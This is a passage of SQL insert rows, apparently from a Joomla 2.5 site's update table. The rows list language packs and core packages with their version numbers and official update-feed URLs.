(142, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(143, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.17.2', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(144, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(145, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(146, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(147, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(148, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(149, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(150, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(151, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(152, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(153, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(154, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(155, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(156, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(157, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.17.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(158, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(159, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(160, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(161, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(162, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(163, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(164, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(165, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(166, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(167, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(168, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(169, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(170, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(171, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(172, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(173, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(174, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(175, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(176, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(177, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(178, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(179, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(180, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(181, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(182, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(183, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(184, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(185, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(186, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(187, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(188, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(189, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(190, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(191, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(192, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(193, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(194, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(195, 3, 0, 0, 'Bengali', '', 'pkg_bn-BD', 'package', '', 0, '2.5.0.1', '', 'http://update.joomla.org/language/details/bn-BD_details.xml', ''),
(196, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(197, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(198, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(199, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(1176, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(1177, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(201, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(202, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(203, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(204, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(205, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(206, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(207, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(208, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(209, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(210, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(211, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(212, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(213, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(214, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(215, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(216, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(217, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(218, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(219, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(220, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(221, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(222, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(223, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(224, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(225, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(226, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(227, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(228, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(229, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(230, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(231, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(232, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(233, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(234, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(235, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(236, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(237, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(238, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(239, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(240, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(241, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(242, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(243, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(244, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(245, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(246, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(247, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(248, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(249, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(250, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(251, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(252, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(253, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(254, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(255, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(256, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(257, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(258, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(259, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(260, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(261, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(262, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(263, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(264, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(265, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(266, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(267, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(268, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(269, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(270, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(271, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(272, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(273, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(274, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(275, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(276, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(277, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(278, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(279, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(280, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(281, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(282, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(283, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(284, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(285, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(286, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(287, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(288, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(289, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(290, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(291, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(292, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(293, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(294, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(295, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(296, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(297, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(298, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(299, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(300, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(301, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(302, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(303, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(304, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(305, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(306, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(307, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(308, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(309, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(310, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(311, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(312, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(313, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(314, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(315, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(316, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(317, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(318, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(319, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
